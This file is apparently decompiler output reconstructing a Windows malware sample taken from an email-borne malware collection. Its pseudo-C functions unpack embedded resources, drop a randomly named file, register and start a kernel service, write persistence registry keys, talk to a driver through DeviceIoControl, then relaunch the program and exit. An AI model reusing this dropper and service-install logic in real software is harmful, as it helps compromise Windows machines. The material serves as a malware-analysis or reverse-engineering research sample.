// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0820/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn08001340(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		Mem35[dwArg04 + 0x00000000:byte] = Mem0[dwArg08 + 0x00000000:byte];
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

void fn08001390(word32 dwArg04, byte bArg08, word32 dwArg0C)
{
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		Mem32[dwArg04 + 0x00000000:byte] = bArg08;
		dwArg04 = dwArg04 + 0x00000001;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

word32 fn080013D0(word32 dwArg04)
{
	if (Mem0[0x08003008:word32] == 0x00000000)
		Mem45[0x08003008:word32] = GetProcessHeap();
	word32 eax_21;
	if (Mem0[0x08003008:word32] != 0x00000000)
		eax_21 = HeapAlloc(Mem0[0x08003008:word32], 0x00000000, dwArg04);
	else
		eax_21 = 0x00000000;
	return eax_21;
}

void fn08001420(word32 dwArg04)
{
	if (Mem0[0x08003008:word32] != 0x00000000)
		HeapFree(Mem0[0x08003008:word32], 0x00000000, dwArg04);
	return;
}

word32 fn08001450(word32 ebx, word32 esi, word32 edi, selector es, selector ds, selector fs, selector gs, ptr32 edxOut)
{
	word32 eax_11 = Mem0[0x08003000:word32] ^ fp - 0x00000004;
	fn08001390(fp + 0xFFFFFE90, 0x00, 0x00000040);
	lstrcpyA(fp + 0xFFFFFD84, GetCommandLineA());
	word32 dwLoc0128_159 = fp + 0xFFFFFD84;
	word32 edx_123;
	*edxOut = fp + 0xFFFFFD84;
	if ((int32) bLoc027C == 0x00000022)
	{
		Mem157[fp + 0xFFFFFD82 + lstrlenA(fp + 0xFFFFFD84):byte] = 0x00;
		*edxOut = fp + 0xFFFFFD85;
		dwLoc0128_159 = fp + 0xFFFFFD85;
	}
	word32 dwLoc0280_150 = 0x00000104;
	if (GetShortPathNameA(dwLoc0128_159, dwLoc0128_159, 0x00000104) != 0x00000000)
	{
		Mem90[fp - 0x00000280:word32] = 0x080010DC;
		lstrcpyA(fp + 0xFFFFFEEC, 0x00000104);
		Mem98[fp - 0x00000280:word32] = dwLoc0128_159;
		lstrcatA(fp + 0xFFFFFEEC, 0x00000104);
		Mem105[fp - 0x00000280:word32] = 0x080010D4;
		lstrcatA(fp + 0xFFFFFEEC, 0x00000104);
		Mem112[fp - 0x00000280:word32] = 0x00000104;
		GetEnvironmentVariableA(0x080010CC, dwLoc0128_159, 0x00000104);
		Mem122[fp - 0x00000280:word32] = fp + 0xFFFFFEDC;
		*edxOut = fp + 0xFFFFFE8C;
		if (CreateProcessA(dwLoc0128_159, fp + 0xFFFFFEEC, 0x00000000, 0x00000000, 0x00000000, 0x08000000, 0x00000000, 0x00000000, fp + 0xFFFFFE8C, 0x00000104) != 0x00000000)
		{
			ExitProcess(0x00000000);
			dwLoc0280_150 = 0x00000000;
		}
	}
	return fn08001FF8(0x00000000, eax_11 ^ fp - 0x00000004, edx_123, ebx, fp - 0x00000004, esi, edi, es, ds, fs, gs, dwLoc0280_150);
}

word32 fn080015A0(word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10)
{
	if (dwArg08 != 0x00000000)
		Mem100[fp - 0x00000008:word32] = FindResourceA(dwArg04, (word32) wArg08, 0x080010E4);
	else if (dwArg0C != 0x00000000)
		Mem116[fp - 0x00000008:word32] = FindResourceA(dwArg04, dwArg0C, 0x080010E4);
	Mem18[fp - 0x0000001C:word32] = 0x00000000;
	word32 eax_23 = LoadResource(dwArg04, 0x080010E4);
	Mem28[fp - 0x0000001C:word32] = 0x00000000;
	word32 eax_32 = SizeofResource(dwArg04, 0x080010E4);
	if (eax_23 != 0x00000000)
	{
		word32 eax_53 = LockResource(eax_23);
		if (eax_53 != 0x00000000)
		{
			Mem71[dwArg10 + 0x00000000:word32] = eax_32;
			Mem77[fp - 0x00000010:word32] = fn080013D0(eax_32);
			fn08001340(0x00000000, eax_53, eax_32);
		}
		FreeResource(eax_23);
	}
	return 0x00000000;
}

word32 fn08001670(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 eax_35;
	if (dwArg08 != 0x00000000 && dwArg0C != 0x00000000)
	{
		word32 eax_73 = CreateFileA(dwArg04, 0x40000000, 0x00000000, 0x00000000, 0x00000002, 0x00000080, 0x00000000);
		if (eax_73 != 0xFFFFFFFF)
		{
			Mem79[fp - 0x0000000C:word32] = 0x00000000;
			Mem82[fp - 0x00000010:word32] = fp + 0x0000000C;
			Mem85[fp - 0x00000014:word32] = dwArg0C;
			Mem88[fp - 0x00000018:word32] = dwArg08;
			Mem91[fp - 0x0000001C:word32] = eax_73;
			WriteFile(0x00000000, 0x00000000, 0x00000002, 0x00000080, 0x00000000);
			Mem96[fp - 0x0000000C:word32] = eax_73;
			CloseHandle(0x00000000);
			eax_35 = 0x00000001;
		}
		else
		{
l080016D0:
			eax_35 = 0x00000000;
		}
	}
	else
		goto l080016D0;
	return eax_35;
}

word16 fn080016E0()
{
	QueryPerformanceCounter(fp - 0x0000000C);
	return (word16) dwLoc0C;
}

void fn08001700(word32 dwArg04, word32 dwArg08)
{
	Mem20[dwArg08 + 0x00000000:byte] = (byte) ((int64) (word32) fn080016E0() % 0x00000019 + 0x00000041);
	Mem32[dwArg08 + 0x00000001:byte] = (byte) ((int64) (word32) fn080016E0() % 0x00000019 + 0x00000061);
	Mem44[dwArg08 + 0x00000002:byte] = (byte) ((int64) (word32) fn080016E0() % 0x00000019 + 0x00000061);
	Mem56[dwArg08 + 0x00000003:byte] = (byte) ((int64) (word32) fn080016E0() % 0x00000009 + 0x00000030);
	Mem68[dwArg08 + 0x00000004:byte] = (byte) ((int64) (word32) fn080016E0() % 0x00000009 + 0x00000030);
	Mem70[dwArg08 + 0x00000005:byte] = 0x00;
	GetEnvironmentVariableA(0x08001104, dwArg04, 0x00000104);
	lstrcatA(dwArg04, 0x080010F0);
	lstrcatA(dwArg04, dwArg08);
	lstrcatA(dwArg04, 0x080010E8);
	return;
}

void fn080017E0(word32 dwArg04)
{
	GetEnvironmentVariableA(0x08001104, dwArg04, 0x00000104);
	lstrcatA(dwArg04, 0x08001110);
	return;
}

void fn08001820(word32 dwArg04, word32 dwArg08)
{
	word32 eax_16 = OpenSCManagerA(0x00000000, 0x00000000, 0x000F003F);
	word32 eax_28 = OpenServiceA(eax_16, dwArg08, 0x000F01FF);
	word32 dwLoc08_145 = eax_28;
	if (eax_28 == 0x00000000)
	{
		Mem114[fp - 0x00000018:word32] = 0x00000000;
		dwLoc08_145 = CreateServiceA(eax_16, dwArg08, 0x00000000, 0x000F01FF, 0x00000001, 0x00000003, 0x00000000, dwArg04, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x000F01FF);
	}
	if (dwLoc08_145 != 0x00000000 && StartServiceA(dwLoc08_145, 0x00000000, 0x00000000) != 0x00000000)
		Mem111[fp - 0x0000000C:word32] = 0x00000001;
	else if (GetLastError() == 0x00000420)
		Mem97[fp - 0x0000000C:word32] = 0x00000001;
	else
		Mem98[fp - 0x0000000C:word32] = 0x00000000;
	if (dwLoc08_145 != 0x00000000)
		CloseServiceHandle(dwLoc08_145);
	return;
}

void fn080018F0(word32 ebx, word32 esi, word32 edi, selector es, selector ds, selector fs, selector gs, word32 dwArg04)
{
	word32 eax_11 = Mem0[0x08003000:word32] ^ fp - 0x00000004;
	lstrcpyA(fp + 0xFFFFFDF4, 0x08001164);
	lstrcatA(fp + 0xFFFFFDF4, dwArg04);
	lstrcatA(fp + 0xFFFFFDF4, 0x080010E8);
	lstrcpyA(fp + 0xFFFFFEF4, 0x08001130);
	lstrcatA(fp + 0xFFFFFEF4, dwArg04);
	lstrcatA(fp + 0xFFFFFEF4, 0x080010E8);
	RegCreateKeyA(0x80000002, fp + 0xFFFFFDF4, fp + 0xFFFFFDF0);
	RegSetValueA(dwLoc0210, 0x00000000, 0x00000001, 0x08001128, 0x00000008);
	RegCloseKey(dwLoc0210);
	RegCreateKeyA(0x80000002, fp + 0xFFFFFEF4, fp + 0xFFFFFDF0);
	RegSetValueA(dwLoc0210, 0x00000000, 0x00000001, 0x08001128, 0x00000008);
	fn08001FF8(RegCloseKey(dwLoc0210), eax_11 ^ fp - 0x00000004, dwLoc0210, ebx, fp - 0x00000004, esi, edi, es, ds, fs, gs, dwLoc0210);
	return;
}

void fn08001A00(word32 ebx, word32 esi, word32 edi, selector es, selector ds, selector fs, selector gs, word32 dwArg04, word32 dwArg08)
{
	word32 eax_11 = Mem0[0x08003000:word32] ^ fp - 0x00000004;
	lstrcpyA(fp + 0xFFFFFDF4, dwArg08);
	lstrcatA(fp + 0xFFFFFDF4, dwArg04);
	RegCreateKeyA(0x80000002, fp + 0xFFFFFDF4, fp + 0xFFFFFDF0);
	RegSetValueExA(dwLoc0210, 0x080011D4, 0x00000000, 0x00000004, fp + 0xFFFFFCE8, 0x00000004);
	RegSetValueExA(dwLoc0210, 0x080011CC, 0x00000000, 0x00000004, fp - 0x00000008, 0x00000004);
	lstrcpyA(fp + 0xFFFFFCEC, 0x080011B8);
	lstrcatA(fp + 0xFFFFFCEC, dwArg04);
	lstrcatA(fp + 0xFFFFFCEC, 0x080010E8);
	RegSetValueExA(dwLoc0210, 0x080011AC, 0x00000000, 0x00000001, fp + 0xFFFFFCEC, lstrlenA(fp + 0xFFFFFCEC) + 0x00000001);
	fn08001390(fp + 0xFFFFFEFF, 0x00, 0x000000F5);
	RegSetValueExA(dwLoc0210, 0x08001198, 0x00000000, 0x00000001, fp + 0xFFFFFEF4, lstrlenA(fp + 0xFFFFFEF4) + 0x00000001);
	fn08001FF8(RegCloseKey(dwLoc0210), eax_11 ^ fp - 0x00000004, fp + 0xFFFFFEF4, ebx, fp - 0x00000004, esi, edi, es, ds, fs, gs, dwLoc0210);
	return;
}

void fn08001BA0()
{
	RegCreateKeyA(0x80000002, 0x08001210, fp - 0x0000000C);
	RegSetValueExA(dwLoc0C, 0x08001204, 0x00000000, 0x00000001, 0x0800126C, lstrlenA(0x0800126C) + 0x00000001);
	RegSetValueExA(dwLoc0C, 0x080011F8, 0x00000000, 0x00000001, 0x08001258, lstrlenA(0x08001258) + 0x00000001);
	RegSetValueExA(dwLoc0C, 0x080011EC, 0x00000000, 0x00000004, fp - 0x00000008, 0x00000004);
	RegSetValueExA(dwLoc0C, 0x080011DC, 0x00000000, 0x00000004, fp - 0x00000018, 0x00000004);
	RegCloseKey(dwLoc0C);
	return;
}

word32 fn08001C70()
{
	return CreateFileA(0x08001278, 0xC0000000, 0x00000000, 0x00000000, 0x00000002, 0x00000080, 0x00000000);
}

void fn08001CA0(word32 ebx, word32 esi, word32 edi, selector es, selector ds, selector fs, selector gs)
{
	word32 dwLoc03FC_27;
	word32 eax_11 = Mem0[0x08003000:word32] ^ fp - 0x00000004;
	word32 eax_16 = GetModuleHandleA(0x00000000);
	GetVersionExA(fp + 0xFFFFFC34);
	word32 edi_3 = edi;
	word32 ebp_7 = fp - 0x00000004;
	if (dwLoc03C8 == 0x00000005 && dwLoc03C4 == 0x00000000)
		dwLoc03FC_27 = 0x00000001;
	else
		dwLoc03FC_27 = 0x00000000;
	word32 dwLoc0400_32;
	if (dwLoc03C8 == 0x00000005 && dwLoc03C4 == 0x00000001)
		dwLoc0400_32 = 0x00000001;
	else
		dwLoc0400_32 = 0x00000000;
	word32 dwLoc0404_339;
	if (dwLoc03C8 == 0x00000005 && dwLoc03C4 == 0x00000002)
		dwLoc0404_339 = 0x00000001;
	else
		dwLoc0404_339 = 0x00000000;
	fn080017E0(fp + 0xFFFFFEE4);
	fn08001700(fp + 0xFFFFFCCC, fp + 0xFFFFFDDC);
	word32 dwLoc0408_134 = fp + 0xFFFFFDDC;
	if (dwLoc03FC_27 != 0x00000000 || (dwLoc0400_32 != 0x00000000 || dwLoc0404_339 != 0x00000000))
	{
		word32 eax_98 = fn080015A0(eax_16, 0x00000065, 0x00000000, fp + 0xFFFFFC2C);
		word32 eax_111 = fn080015A0(eax_16, 0x00000066, 0x00000000, fp + 0xFFFFFC28);
		word32 eax_115 = fn08001C70();
		if (eax_115 != 0xFFFFFFFF)
		{
			Mem170[fp - 0x0000040C:word32] = fp + 0xFFFFFC18;
			Mem172[fp - 0x00000410:word32] = 0x00000000;
			DeviceIoControl(eax_115, 0x9D082440, eax_98, dwLoc03D4, 0x00000000, 0x00000066, 0x00000000, 0x00000000);
			Mem193[fp - 0x0000040C:word32] = fp + 0xFFFFFC18;
			Mem195[fp - 0x00000410:word32] = 0x00000000;
			DeviceIoControl(eax_115, 0x9D082444, eax_111, dwLoc03D8, 0x00000000, 0x00000066, 0x00000000, 0x00000000);
			CloseHandle(eax_115);
		}
		else
		{
			Mem223[fp - 0x0000040C:word32] = eax_111;
			Mem226[fp - 0x00000410:word32] = fp + 0xFFFFFEE4;
			if (fn08001670(0x00000066, 0x00000000, dwLoc03D8) == 0x00000001)
				Mem326[fp + 0xFFFFFC24:word32] = 0x00000001;
			fn08001670(fp + 0xFFFFFCCC, eax_98, dwLoc03D4);
			fn08001BA0();
			fn080018F0(ebx, esi, edi, es, ds, fs, gs, fp + 0xFFFFFDDC);
			fn08001820(fp + 0xFFFFFCCC, fp + 0xFFFFFDDC);
			Sleep(0x000001F4);
			fn08001A00(ebx, esi, edi, es, ds, fs, gs, fp + 0xFFFFFDDC, 0x080012A8);
			fn08001A00(ebx, esi, edi, es, ds, fs, gs, fp + 0xFFFFFDDC, 0x08001288);
			Sleep(0x000001F4);
			word32 eax_271 = fn08001C70();
			if (eax_271 != 0xFFFFFFFF)
			{
				Mem280[fp - 0x00000408:word32] = 0x00000000;
				DeviceIoControl(eax_271, 0x9D082444, eax_111, dwLoc03D8, 0x00000000, 0x00000000, fp + 0xFFFFFC10, 0x000001F4);
				Mem302[fp - 0x00000408:word32] = 0x00000000;
				DeviceIoControl(eax_271, 0x9D082480, 0x00000000, 0x00000000, 0x00000000, 0x00000000, fp + 0xFFFFFC10, 0x000001F4);
				Mem323[fp - 0x00000408:word32] = eax_271;
				CloseHandle(0x000001F4);
			}
		}
		fn08001420(eax_98);
		fn08001420(eax_111);
		dwLoc0408_134 = eax_111;
		if (0x00000000 != 0x00000000)
		{
			dwLoc0408_134 = fp + 0xFFFFFEE4;
			word32 eax_149 = LoadLibraryA(fp + 0xFFFFFEE4);
			if (eax_149 != 0x00000000)
			{
				dwLoc0408_134 = 0x08001284;
				word32 eax_159 = GetProcAddress(eax_149, 0x08001284);
				if (eax_159 != 0x00000000)
					eax_159();
			}
		}
	}
	word32 edx_78;
	word32 eax_79 = fn08001450(ebx, esi, edi_3, es, ds, fs, gs, out edx_78);
	fn08001FF8(eax_79, eax_11 ^ fp - 0x00000004, edx_78, ebx, ebp_7, esi, edi_3, es, ds, fs, gs, dwLoc0408_134);
	return;
}

word32 fn08001FF8(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 esi, word32 edi, selector es, selector ds, selector fs, selector gs, word32 dwArg00)
{
	if (ecx == Mem0[0x08003000:word32] && ecx != 0x00000000)
		return eax;
	else
	{
		Mem37[0x08003110:word32] = eax;
		Mem38[0x0800310C:word32] = ecx;
		Mem40[0x08003108:word32] = edx;
		Mem42[0x08003104:word32] = ebx;
		Mem44[0x08003100:word32] = esi;
		Mem45[0x080030FC:word32] = edi;
		Mem47[0x08003128:word16] = ss;
		Mem49[0x0800311C:word16] = cs;
		Mem51[0x080030F8:word16] = ds;
		Mem53[0x080030F4:word16] = es;
		Mem55[0x080030F0:word16] = fs;
		Mem57[0x080030EC:word16] = gs;
		Mem60[0x08003120:word32] = cond(fp - 0x00000324);
		Mem66[0x08003124:word32] = fp + 0x00000004;
		Mem67[0x08003118:word32] = dwArg00;
		Mem68[0x08003060:word32] = 0x00010001;
		Mem71[0x0800301C:word32] = dwArg00;
		Mem75[0x08003114:word32] = ebp;
		Mem76[0x08003010:word32] = 0xC0000409;
		Mem82[0x08003014:word32] = 0x00000001;
		SetUnhandledExceptionFilter(0x00000000);
		UnhandledExceptionFilter(0x080012C8);
		return TerminateProcess(GetCurrentProcess(), 0xC0000409);
	}
}

